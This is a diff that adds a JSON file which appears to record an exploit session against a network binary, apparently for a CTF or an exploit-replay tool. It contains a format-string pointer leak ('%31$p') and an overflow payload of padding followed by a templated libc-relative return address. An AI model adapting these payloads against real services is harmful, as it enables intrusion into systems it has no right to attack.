@@ -1,0 +1,7 @@
+[
+    "1Who r u?\\n", 
+    "0%31$p\\n", 
+    "1welcome{{{HEAP_BASE:49185:3:ORI:7:0x783021}}}{{{LIBC_BASE:133168:12:HEX:10:0x7f94f261a830}}}", 
+    "0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa{{{LIBC_BASE:283158:8:ORI:72:0x7f94f263f216}}}caaadaaa\\n", 
+    "1aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa{{{LIBC_BASE:283158:6:ORI:72:0x7f94f263f216}}}HTTP/1.1 404 Not Found\\r\\nContent{{{HEAP_BASE:123949:3:ORI:109:0x79542d}}}pe: {{{HEAP_BASE:62836:3:ORI:116:0x786574}}}t/html; charset=UTF-8\\r\\nContent-Length: 23\\r\\nServer: E{{{HEAP_BASE:131937:3:ORI:171:0x797361}}}Server (Li{{{HEAP_BASE:66926:3:ORI:184:0x78756e}}})\\r\\n\\r\\n<h3>Page Not Found</h3>"
+]
